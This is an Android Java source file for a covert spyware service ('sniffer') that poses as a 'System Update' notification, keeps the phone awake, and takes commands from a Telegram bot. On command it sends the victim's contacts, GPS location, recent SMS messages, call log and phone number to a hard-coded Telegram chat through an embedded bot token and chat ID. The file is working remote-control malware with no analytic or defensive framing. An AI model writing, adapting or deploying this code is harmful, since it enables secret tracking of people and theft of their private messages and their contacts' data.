package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastUpdateId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
        wakeLock.acquire();
        
        startForegroundService();
        
        sendToTelegram("✅ System Update Started");
        
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommands();
            }
        }, 0, 3000);
    }

    private void startForegroundService() {
        String channelId = "main_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("Active")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        startForeground(1, notification);
    }

    private void checkCommands() {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    String body = response.body().string();
                    JSONObject json = new JSONObject(body);
                    JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id") + 1;
                        
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                executeCommand(text);
                            }
                        }
                    }
                    response.close();
                } catch (Exception e) {}
            }
            @Override
            public void onFailure(Call call, IOException e) {}
        });
    }

    private void executeCommand(String command) {
        switch (command) {
            case "/help":
                sendHelp();
                break;
            case "/info":
                sendDeviceInfo();
                break;
            case "/contacts":
                getContacts();
                break;
            case "/location":
                getLocation();
                break;
            case "/sms":
                getSms();
                break;
            case "/calls":
                getCallLog();
                break;
            case "/test":
                sendToTelegram("✅ System is working - " + new java.util.Date().toString());
                break;
        }
    }

    private void sendHelp() {
        String help = "📋 **Available Commands:**\n\n" +
                "/info - Device info\n" +
                "/contacts - Contacts list\n" +
                "/location - GPS location\n" +
                "/sms - Last 10 SMS\n" +
                "/calls - Last 10 calls\n" +
                "/test - Check service";
        sendToTelegram(help);
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
            }
            
            sendToTelegram("📱 Device Info:\n" + info.toString(2));
        } catch (Exception e) {
            sendToTelegram("Error: " + e.getMessage());
        }
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No contacts permission");
                    return;
                }
                
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
                StringBuilder sb = new StringBuilder("📇 Contacts:\n\n");
                int count = 0;
                while (cursor != null && cursor.moveToNext() && count < 50) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                if (cursor != null) cursor.close();
                if (count == 0) sb.append("No contacts found");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("Error: " + e.getMessage());
            }
        }).start();
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No location permission");
                return;
            }
            
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (location != null) {
                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
            } else {
                sendToTelegram("📍 Location not available");
            }
        } catch (Exception e) {
            sendToTelegram("Error: " + e.getMessage());
        }
    }

    private void getSms() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No SMS permission");
                    return;
                }
                
                Cursor cursor = getContentResolver().query(
                    android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📨 Last 10 SMS:\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("No SMS found");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("Error: " + e.getMessage());
            }
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No call log permission");
                    return;
                }
                
                Cursor cursor = getContentResolver().query(
                    android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📞 Last 10 Calls:\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex("number"));
                    String type = cursor.getString(cursor.getColumnIndex("type"));
                    String duration = cursor.getString(cursor.getColumnIndex("duration"));
                    String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("No calls found");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("Error: " + e.getMessage());
            }
        }).start();
    }

    private void sendToTelegram(String text) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder()
                    .add("chat_id", CHAT_ID)
                    .add("text", text)
                    .build())
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(Call call, Response response) {
                try { response.close(); } catch (Exception e) {}
            }
            @Override
            public void onFailure(Call call, IOException e) {}
        });
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }
}
